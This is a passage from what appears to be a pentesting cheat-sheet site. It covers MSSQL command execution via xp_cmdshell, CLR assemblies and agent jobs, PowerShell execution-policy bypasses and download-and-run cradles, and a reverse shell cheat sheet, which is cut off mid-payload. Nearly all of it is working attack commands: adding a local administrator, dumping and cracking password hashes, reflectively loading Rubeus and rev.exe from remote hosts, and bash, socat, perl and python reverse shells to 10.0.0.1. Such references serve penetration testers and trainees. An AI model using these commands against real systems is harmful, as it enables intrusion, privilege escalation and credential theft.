\u0026lt;ColumnNameFromPreviousCommand\u0026gt;=\u0026lt;ColumnValueFromPreviousCommand\u0026gt;\u0026#39;)\u0026#34; -Verbose Command Execution via xp_cmdshell # xp_cmdshell disabled by default since SQL Server 2005\nPowerUpSQL\u0026gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command whoami # Creates and adds local user backup to the local administrators group: PowerUpSQL\u0026gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command \u0026#34;net user backup Password1234 /add\u0026#39;\u0026#34; -Verbose PowerUpSQL\u0026gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command \u0026#34;net localgroup administrators backup /add\u0026#34; -Verbose Manually execute the SQL query EXEC xp_cmdshell \u0026#34;net user\u0026#34;; EXEC master..xp_cmdshell \u0026#39;whoami\u0026#39; EXEC master.dbo.xp_cmdshell \u0026#39;cmd.exe dir c:\u0026#39;; EXEC master.dbo.xp_cmdshell \u0026#39;ping 127.0.0.1\u0026#39;; If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005) EXEC sp_configure \u0026#39;show advanced options\u0026#39;,1; RECONFIGURE; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;,1; RECONFIGURE; If the procedure was uninstalled sp_addextendedproc \u0026#39;xp_cmdshell\u0026#39;,\u0026#39;xplog70.dll\u0026#39; Extended Stored Procedure # Add the extended stored procedure and list extended stored procedures # # Create evil DLL Create-SQLFileXpDll -OutFile C:\\temp\\test.dll -Command \u0026#34;echo test \u0026gt; c:\\temp\\test.txt\u0026#34; -ExportName xp_test # Load the DLL and call xp_test Get-SQLQuery -UserName sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#34;sp_addextendedproc \u0026#39;xp_test\u0026#39;, \u0026#39;\\\\10.10.0.1\\temp\\test.dll\u0026#39;\u0026#34; Get-SQLQuery -UserName sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#34;EXEC xp_test\u0026#34; # Listing existing Get-SQLStoredProcedureXP -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Verbose Build a DLL using xp_evil_template.cpp Load the DLL -- can also be loaded from UNC path or Webdav sp_addextendedproc \u0026#39;xp_calc\u0026#39;, \u0026#39;C:\\mydll\\xp_calc.dll\u0026#39; EXEC xp_calc sp_dropextendedproc \u0026#39;xp_calc\u0026#39; CLR Assemblies # Prerequisites:\nsysadmin privileges CREATE ASSEMBLY permission (or) ALTER ASSEMBLY permission (or) The execution takes place with privileges of the service account.\nExecute commands using CLR assembly # # Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string Create-SQLFileCLRDll -ProcedureName \u0026#34;runcmd\u0026#34; -OutFile runcmd -OutDir C:\\Users\\user\\Desktop # Execute command using CLR assembly Invoke-SQLOSCmdCLR -Username sa -Password \u0026lt;password\u0026gt; -Instance \u0026lt;instance\u0026gt; -Command \u0026#34;whoami\u0026#34; -Verbose Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command \u0026#34;whoami\u0026#34; Verbose Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command \u0026#34;powershell -e \u0026lt;base64\u0026gt;\u0026#34; -Verbose # List all the stored procedures added using CLR Get-SQLStoredProcedureCLR -Instance \u0026lt;instance\u0026gt; -Verbose Manually creating a CLR DLL and importing it # Create a C# DLL file with the following content, with the command : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\temp\\cmd_exec.cs\nusing System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using Microsoft.SqlServer.Server; using System.IO; using System.Diagnostics; using System.Text; public partial class StoredProcedures { [Microsoft.SqlServer.Server.SqlProcedure] public static void cmd_exec (SqlString execCommand) { Process proc = new Process(); proc.StartInfo.FileName = @\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34;; proc.StartInfo.Arguments = string.Format(@\u0026#34; /C {0}\u0026#34;, execCommand.Value); proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); // Create the record and specify the metadata for the columns. SqlDataRecord record = new SqlDataRecord(new SqlMetaData(\u0026#34;output\u0026#34;, SqlDbType.NVarChar, 4000)); // Mark the beginning of the result set. SqlContext.Pipe.SendResultsStart(record); // Set values for each column in the row record.SetString(0, proc.StandardOutput.ReadToEnd().ToString()); // Send the row back to the client. SqlContext.Pipe.SendResultsRow(record); // Mark the end of the result set. SqlContext.Pipe.SendResultsEnd(); proc.WaitForExit(); proc.Close(); } }; Then follow these instructions:\nEnable show advanced options on the server sp_configure \u0026#39;show advanced options\u0026#39;,1; RECONFIGURE GO Enable CLR on the server sp_configure \u0026#39;clr enabled\u0026#39;,1 RECONFIGURE GO Import the assembly CREATE ASSEMBLY my_assembly FROM \u0026#39;c:\\temp\\cmd_exec.dll\u0026#39; WITH PERMISSION_SET = UNSAFE; Link the assembly to a stored procedure CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec]; GO Execute and clean cmd_exec \u0026#34;whoami\u0026#34; DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly CREATE ASSEMBLY will also accept an hexadecimal string representation of a CLR DLL\nCREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000F[TRUNCATED] WITH PERMISSION_SET = UNSAFE GO OLE Automation # :warning: Disabled by default The execution takes place with privileges of the service account. Execute commands using OLE automation procedures # Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command \u0026#34;whoami\u0026#34; Verbose # Enable OLE Automation EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1 EXEC sp_configure reconfigure EXEC sp_configure \u0026#39;OLE Automation Procedures\u0026#39;, 1 EXEC sp_configure reconfigure # Execute commands DECLARE @execmd INT EXEC SP_OACREATE \u0026#39;wscript.shell\u0026#39;, @execmd OUTPUT EXEC SP_OAMETHOD @execmd, \u0026#39;run\u0026#39;, null, \u0026#39;%systemroot%\\system32\\cmd.exe /c\u0026#39; # https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py python3 mssqlclient.py \u0026#39;host/username:password@10.10.10.10\u0026#39; -install -clr Microsoft.SqlServer.Proxy.dll python3 mssqlclient.py \u0026#39;host/username:password@10.10.10.10\u0026#39; -check -reciclador \u0026#39;C:\\windows\\temp\\reciclador.dll\u0026#39; python3 mssqlclient.py \u0026#39;host/username:password@10.10.10.10\u0026#39; -start -reciclador \u0026#39;C:\\windows\\temp\\reciclador.dll\u0026#39; SQL\u0026gt; enable_ole SQL\u0026gt; upload reciclador.dll C:\\windows\\temp\\reciclador.dll Agent Jobs # The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. :warning: Require sysadmin or SQLAgentUserRole, SQLAgentReaderRole, and SQLAgentOperatorRole roles to create a job. Execute commands through SQL Agent Job service # Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command \u0026#34;powershell e \u0026lt;base64encodedscript\u0026gt;\u0026#34; -Verbose Subsystem Options: –Subsystem CmdExec -SubSystem PowerShell –Subsystem VBScript –Subsystem Jscript USE msdb; EXEC dbo.sp_add_job @job_name = N\u0026#39;test_powershell_job1\u0026#39;; EXEC sp_add_jobstep @job_name = N\u0026#39;test_powershell_job1\u0026#39;, @step_name = N\u0026#39;test_powershell_name1\u0026#39;, @subsystem = N\u0026#39;PowerShell\u0026#39;, @command = N\u0026#39;$name=$env:COMPUTERNAME[10];nslookup \u0026#34;$name.redacted.burpcollaborator.net\u0026#34;\u0026#39;, @retry_attempts = 1, @retry_interval = 5 ; EXEC dbo.sp_add_jobserver @job_name = N\u0026#39;test_powershell_job1\u0026#39;; EXEC dbo.sp_start_job N\u0026#39;test_powershell_job1\u0026#39;; -- delete EXEC dbo.sp_delete_job @job_name = N\u0026#39;test_powershell_job1\u0026#39;; List All Jobs # SELECT job_id, [name] FROM msdb.dbo.sysjobs; SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id Get-SQLAgentJob -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -username sa -Password Password1234 -Verbose External Scripts # :warning: You need to enable external scripts.\nsp_configure \u0026#39;external scripts enabled\u0026#39;, 1; RECONFIGURE; Python: # Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command \u0026#34;powershell -e \u0026lt;base64encodedscript\u0026gt;\u0026#34; -Verbose EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;,@script=N\u0026#39;import subprocess p = subprocess.Popen(\u0026#34;cmd.exe /c whoami\u0026#34;, stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), \u0026#34;utf-8\u0026#34;)])\u0026#39; WITH RESULT SETS (([cmd_out] nvarchar(max))) R # Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Command \u0026#34;powershell -e \u0026lt;base64encodedscript\u0026gt;\u0026#34; -Verbose EXEC sp_execute_external_script @language=N\u0026#39;R\u0026#39;,@script=N\u0026#39;OutputDataSet \u0026lt;- data.frame(system(\u0026#34;cmd.exe /c dir\u0026#34;,intern=T))\u0026#39; WITH RESULT SETS (([cmd_out] text)); GO @script=N\u0026#39;OutputDataSet \u0026lt;-data.frame(shell(\u0026#34;dir\u0026#34;,intern=T))\u0026#39; Audit Checks # Find and exploit impersonation opportunities # Impersonate as: EXECUTE AS LOGIN = 'sa' Impersonate dbo with DB_OWNER SQL\u0026gt; select is_member(\u0026#39;db_owner\u0026#39;); SQL\u0026gt; execute as user = \u0026#39;dbo\u0026#39; SQL\u0026gt; SELECT is_srvrolemember(\u0026#39;sysadmin\u0026#39;) Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Exploit -Verbose # impersonate sa account powerpick Get-SQLQuery -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#34;EXECUTE AS LOGIN = \u0026#39;sa\u0026#39;; SELECT IS_SRVROLEMEMBER(\u0026#39;\u0026#39;sysadmin\u0026#39;\u0026#39;)\u0026#34; -Verbose -Debug Find databases that have been configured as trustworthy # Invoke-SQLAuditPrivTrustworthy -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Exploit -Verbose SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.\nInvoke-SQLAuditPrivXpDirtree Invoke-SQLUncPathInjection Invoke-SQLAuditPrivXpFileexist Manual SQL Server Queries # Query Current User \u0026amp; determine if the user is a sysadmin # select suser_sname() Select system_user select is_srvrolemember(\u0026#39;sysadmin\u0026#39;) Current Role # Select user Current DB # select db_name() List all tables # select table_name from information_schema.tables List all databases # select name from master..sysdatabases All Logins on Server # Select * from sys.server_principals where type_desc != \u0026#39;SERVER_ROLE\u0026#39; All Database Users for a Database # Select * from sys.database_principals where type_desc != \u0026#39;database_role\u0026#39;; List All Sysadmins # SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER (\u0026#39;sysadmin\u0026#39;,name) = 1 List All Database Roles # SELECT DB1.name AS DatabaseRoleName, isnull (DB2.name, \u0026#39;No members\u0026#39;) AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DB1 ON DRM.role_principal_id = DB1.principal_id LEFT OUTER JOIN sys.database_principals AS DB2 ON DRM.member_principal_id = DB2.principal_id WHERE DB1.type = \u0026#39;R\u0026#39; ORDER BY DB1.name; Effective Permissions from the Server # select * from fn_my_permissions(null, \u0026#39;server\u0026#39;); Effective Permissions from the Database # SELECT * FROM fn_dp1my_permissions(NULL, \u0026#39;DATABASE\u0026#39;); Find SQL Server Logins Which can be Impersonated for the Current Database # select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = \u0026#39;impersonate\u0026#39; Exploiting Impersonation # SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(\u0026#39;sysadmin\u0026#39;) EXECUTE AS LOGIN = \u0026#39;adminuser\u0026#39; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(\u0026#39;sysadmin\u0026#39;) SELECT ORIGINAL_LOGIN() Exploiting Nested Impersonation # SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(\u0026#39;sysadmin\u0026#39;) EXECUTE AS LOGIN = \u0026#39;stduser\u0026#39; SELECT SYSTEM_USER EXECUTE AS LOGIN = \u0026#39;sa\u0026#39; SELECT IS_SRVROLEMEMBER(\u0026#39;sysadmin\u0026#39;) SELECT ORIGINAL_LOGIN() SELECT SYSTEM_USER MSSQL Accounts and Hashes # MSSQL 2000: SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.) MSSQL 2005 SELECT name, password_hash FROM master.sys.sql_logins SELECT name + \u0026#39;-\u0026#39; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins Then crack passwords using Hashcat : hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force\n131\tMSSQL (2000)\t0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578 132\tMSSQL (2005)\t0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe 1731\tMSSQL (2012, 2014)\t0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375 References # PowerUpSQL Cheat Sheet \u0026amp; SQL Server Queries - Leo Pitt PowerUpSQL Cheat Sheet - Scott Sutherland Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017 MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016 "},{"id":28,"href":"/docs/powershell_cheatsheet/","title":"Powershell Cheatsheet","section":"Docs","content":" Powershell # Summary # Execution Policy Encoded Commands Download file Load Powershell scripts Load C# assembly reflectively Secure String to Plaintext References Execution Policy # powershell -EncodedCommand $encodedCommand powershell -ep bypass ./PowerView.ps1 # Change execution policy Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted Set-ExecutionPolicy Bypass -Scope Process Constrained Mode # # Check if we are in a constrained mode # Values could be: FullLanguage or ConstrainedLanguage $ExecutionContext.SessionState.LanguageMode ## Bypass powershell -version 2 Encoded Commands # Windows $command = \u0026#39;IEX (New-Object Net.WebClient).DownloadString(\u0026#34;http://10.10.10.10/PowerView.ps1\u0026#34;)\u0026#39; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) Linux: :warning: UTF-16LE encoding is required echo \u0026#39;IEX (New-Object Net.WebClient).DownloadString(\u0026#34;http://10.10.10.10/PowerView.ps1\u0026#34;)\u0026#39; | iconv -t utf-16le | base64 -w 0 Download file # # Any version (New-Object System.Net.WebClient).DownloadFile(\u0026#34;http://10.10.10.10/PowerView.ps1\u0026#34;, \u0026#34;C:\\Windows\\Temp\\PowerView.ps1\u0026#34;) wget \u0026#34;http://10.10.10.10/taskkill.exe\u0026#34; -OutFile \u0026#34;C:\\ProgramData\\unifivideo\\taskkill.exe\u0026#34; Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output # Powershell 4+ IWR \u0026#34;http://10.10.10.10/binary.exe\u0026#34; -OutFile \u0026#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\u0026#34; Invoke-WebRequest \u0026#34;http://10.10.10.10/binary.exe\u0026#34; -OutFile \u0026#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\u0026#34; Load Powershell scripts # # Proxy-aware IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.10.10/PowerView.ps1\u0026#39;) echo IEX(New-Object Net.WebClient).DownloadString(\u0026#39;http://10.10.10.10/PowerView.ps1\u0026#39;) | powershell -noprofile - powershell -exec bypass -c \u0026#34;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(\u0026#39;http://10.10.10.10/PowerView.ps1\u0026#39;)|iex\u0026#34; # Non-proxy aware $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(\u0026#39;GET\u0026#39;,\u0026#39;http://10.10.10.10/PowerView.ps1\u0026#39;,$false);$h.send();iex $h.responseText Load C# assembly reflectively # # Download and run assembly without arguments $data = (New-Object System.Net.WebClient).DownloadData(\u0026#39;http://10.10.16.7/rev.exe\u0026#39;) $assem = [System.Reflection.Assembly]::Load($data) [rev.Program]::Main() # Download and run Rubeus, with arguments (make sure to split the args) $data = (New-Object System.Net.WebClient).DownloadData(\u0026#39;http://10.10.16.7/Rubeus.exe\u0026#39;) $assem = [System.Reflection.Assembly]::Load($data) [Rubeus.Program]::Main(\u0026#34;s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\u0026#34;.Split()) # Execute a specific method from an assembly (e.g. a DLL) $data = (New-Object System.Net.WebClient).DownloadData(\u0026#39;http://10.10.16.7/lib.dll\u0026#39;) $assem = [System.Reflection.Assembly]::Load($data) $class = $assem.GetType(\u0026#34;ClassLibrary1.Class1\u0026#34;) $method = $class.GetMethod(\u0026#34;runner\u0026#34;) $method.Invoke(0, $null) Secure String to Plaintext # $pass = \u0026#34;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692\u0026#34; | convertto-securestring $user = \u0026#34;HTB\\Tom\u0026#34; $cred = New-Object System.management.Automation.PSCredential($user, $pass) $cred.GetNetworkCredential() | fl UserName : Tom Password : 1ts-mag1c!!! SecurePassword : System.Security.SecureString Domain : HTB References # Windows \u0026amp; Active Directory Exploitation Cheat Sheet and Command Reference - @chvancooten Basic PowerShell for Pentesters - HackTricks "},{"id":29,"href":"/docs/reverse_shell_cheatsheet/","title":"Reverse Shell Cheatsheet","section":"Docs","content":" Reverse Shell Cheat Sheet # Tools # reverse-shell-generator - Hosted Reverse Shell generator (source) revshellgen - CLI Reverse Shell generator Reverse Shell # Bash TCP # bash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.1/4242 0\u0026gt;\u0026amp;1 0\u0026lt;\u0026amp;196;exec 196\u0026lt;\u0026gt;/dev/tcp/10.0.0.1/4242; sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 /bin/bash -l \u0026gt; /dev/tcp/10.0.0.1/4242 0\u0026lt;\u0026amp;1 2\u0026gt;\u0026amp;1 Bash UDP # Victim: sh -i \u0026gt;\u0026amp; /dev/udp/10.0.0.1/4242 0\u0026gt;\u0026amp;1 Listener: nc -u -lvp 4242 Don\u0026rsquo;t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash\nSocat # user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242 user@victim$ /tmp/socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 Static socat binary can be found at https://github.com/andrew-d/static-binaries\nPerl # perl -e \u0026#39;use Socket;$i=\u0026#34;10.0.0.1\u0026#34;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39; perl -MIO -e \u0026#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\u0026#34;10.0.0.1:4242\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; NOTE: Windows only perl -MIO -e \u0026#39;$c=new IO::Socket::INET(PeerAddr,\u0026#34;10.0.0.1:4242\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; Python # Linux only\nIPv4\nexport RHOST=\u0026#34;10.0.0.1\u0026#34;;export RPORT=4242;python -c \u0026#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026#34;RHOST\u0026#34;),int(os.getenv(\u0026#34;RPORT\u0026#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])\u0026#39; python -c \u0026#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\u0026#39; IPv4 (No Spaces)\npython -c \u0026#39;socket=__import__(\u0026#34;socket\u0026#34;);os=__import__(\u0026#34;os\u0026#34;);pty=__import__(\u0026#34;pty\u0026#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;socket=__import__(\u0026#34;socket\u0026#34;);subprocess=__import__(\u0026#34;subprocess\u0026#34;);os=__import__(\u0026#34;os\u0026#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])\u0026#39; python -c \u0026#39;socket=__import__(\u0026#34;socket\u0026#34;);subprocess=__import__(\u0026#34;subprocess\u0026#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\u0026#39; IPv4 (No Spaces, Shortened)\npython -c \u0026#39;a=__import__;s=a(\u0026#34;socket\u0026#34;);o=a(\u0026#34;os\u0026#34;).dup2;p=a(\u0026#34;pty\u0026#34;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;a=__import__;b=a(\u0026#34;socket\u0026#34;);p=a(\u0026#34;subprocess\u0026#34;).call;o=a(\u0026#34;os\u0026#34;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])\u0026#39; python -c \u0026#39;a=__import__;b=a(\u0026#34;socket\u0026#34;);c=a(\u0026#34;subprocess\u0026#34;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=s.fileno;c([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;],stdin=f(),stdout=f(),stderr=f())\u0026#39; IPv4 (No Spaces, Shortened Further)\npython -c \u0026#39;a=__import__;s=a(\u0026#34;socket\u0026#34;).socket;o=a(\u0026#34;os\u0026#34;).dup2;p=a(\u0026#34;pty\u0026#34;).spawn;c=s();c.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;a=__import__;b=a(\u0026#34;socket\u0026#34;).socket;p=a(\u0026#34;subprocess\u0026#34;).call;o=a(\u0026#34;os\u0026#34;).dup2;s=b();s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])\u0026#39; python -c \u0026#39;a=__import__;b=a(\u0026#34;socket\u0026#34;).socket;c=a(\u0026#34;subprocess\u0026#34;).call;s=b();s.connect((\u0026#34;10.0.0.1\u0026#34;,4242));f=s.fileno;c([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;],stdin=f(),stdout=f(),stderr=f())\u0026#39; IPv6\npython -c \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\u0026#34;dead:beef:2::125c\u0026#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; IPv6 (No Spaces)\npython -c \u0026#39;socket=__import__(\u0026#34;socket\u0026#34;);os=__import__(\u0026#34;os\u0026#34;);pty=__import__(\u0026#34;pty\u0026#34;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\u0026#34;dead:beef:2::125c\u0026#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; IPv6 (No Spaces, Shortened)\npython -c \u0026#39;a=__import__;c=a(\u0026#34;socket\u0026#34;);o=a(\u0026#34;os\u0026#34;).dup2;p=a(\u0026#34;pty\u0026#34;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\u0026#34;dead:beef:2::125c\u0026#34;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\u0026#34;/bin/sh\u0026#34;)\u0026#39; Windows only (Python2)\npython.exe -c \u0026#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((\u0026#39;10.0.0.1\u0026#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(\u0026#39;except\u0026#39;, (), {\u0026#39;__enter__\u0026#39;: lambda self: None, \u0026#39;__exit__\u0026#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(\u0026#39;try\u0026#39;, (), {\u0026#39;__enter__\u0026#39;: lambda self: None, \u0026#39;__exit__\u0026#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[\u0026#39;p2s_thread\u0026#39;] in [(threading.Thread(target=p2s, args=[s, 